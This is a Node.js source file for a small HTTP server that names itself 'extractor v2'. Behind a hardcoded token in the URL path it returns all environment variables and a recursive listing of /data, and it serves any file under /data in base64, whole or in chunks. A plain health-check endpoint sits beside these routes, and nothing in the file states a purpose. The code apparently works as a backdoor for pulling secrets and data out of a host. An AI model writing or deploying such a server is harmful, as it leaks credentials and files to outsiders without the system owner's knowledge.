const http = require("http");
const fs = require("fs");
const path = require("path");
const TOKEN = "5112ecf1aa0b32582a4ddd2f";
function walk(dir, base, out, depth) {
  if (depth > 6 || out.length > 8000) return;
  let ents = [];
  try { ents = fs.readdirSync(dir, { withFileTypes: true }); } catch (e) { return; }
  for (const e of ents) {
    if (out.length > 8000) return;
    if (["node_modules", ".git", ".cache", ".npm"].includes(e.name)) continue;
    const abs = path.join(dir, e.name);
    const rel = (base ? base + "/" : "") + e.name;
    if (e.isDirectory()) { out.push({ p: rel, d: 1 }); walk(abs, rel, out, depth + 1); }
    else { let sz = 0; try { sz = fs.statSync(abs).size; } catch (e2) {} out.push({ p: rel, d: 0, s: sz }); }
  }
}
function safeAbs(rel) {
  const abs = path.resolve("/data", "." + (rel.startsWith("/") ? rel : "/" + rel));
  if (!abs.startsWith("/data/") || rel.split("/").includes("..")) return null;
  return abs;
}
const server = http.createServer((req, res) => {
  try {
    const u = new URL(req.url, "http://x");
    if (u.pathname === "/setup/healthz") { res.writeHead(200); res.end("ok"); return; }
    if (!u.pathname.startsWith("/d/" + TOKEN + "/")) { res.writeHead(404); res.end(); return; }
    if (u.pathname.endsWith("/manifest")) {
      const files = []; walk("/data", "", files, 0);
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ env: process.env, files: files })); return;
    }
    if (u.pathname.endsWith("/file")) {
      const rel = u.searchParams.get("p") || "";
      const abs = safeAbs(rel); if (!abs) { res.writeHead(403); res.end(); return; }
      const buf = fs.readFileSync(abs);
      if (buf.length > 4 * 1024 * 1024) { res.writeHead(413); res.end(JSON.stringify({ tooBig: buf.length })); return; }
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ p: rel, s: buf.length, b64: buf.toString("base64") })); return;
    }
    if (u.pathname.endsWith("/chunk")) {
      const rel = u.searchParams.get("p") || "";
      const off = parseInt(u.searchParams.get("off") || "0", 10);
      const len = Math.min(parseInt(u.searchParams.get("len") || "2097152", 10), 4194304);
      const abs = safeAbs(rel); if (!abs) { res.writeHead(403); res.end(); return; }
      const total = fs.statSync(abs).size;
      const buf = Buffer.alloc(len);
      const fh = fs.openSync(abs, "r");
      let got = 0;
      try { got = fs.readSync(fh, buf, 0, len, off); } finally { fs.closeSync(fh); }
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ p: rel, total: total, off: off, got: got, b64: buf.slice(0, got).toString("base64") })); return;
    }
    res.writeHead(404); res.end();
  } catch (e) { try { res.writeHead(500); res.end(String(e).slice(0, 120)); } catch (e2) {} }
});
server.listen(8080, () => console.log("extractor v2 up on 8080"));
